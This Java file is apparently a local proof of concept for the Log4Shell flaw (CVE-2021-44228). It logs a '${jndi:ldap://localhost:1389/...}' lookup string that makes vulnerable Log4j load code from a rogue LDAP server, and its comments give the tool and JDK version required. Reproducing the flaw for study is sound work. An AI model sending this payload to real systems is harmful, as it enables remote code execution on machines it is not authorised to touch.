package com.anonuser;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4J_CVE_2021_44228 {

    public static void main(String [] args) {

        // Pulls and instantiates a payload from the LDAP server. Shell command, defined when starting the LDAP server, is executed
        // Requires an LDAP server on ldap://127.0.0.1:1389/o=reference. I use https://github.com/veracode-research/rogue-jndi
        // Requires JDK <= 8u172 ((present in Berlin))
        
        Logger logger = LogManager.getLogger();
        logger.error("${jndi:ldap://localhost:1389/o=reference}");

    }
} 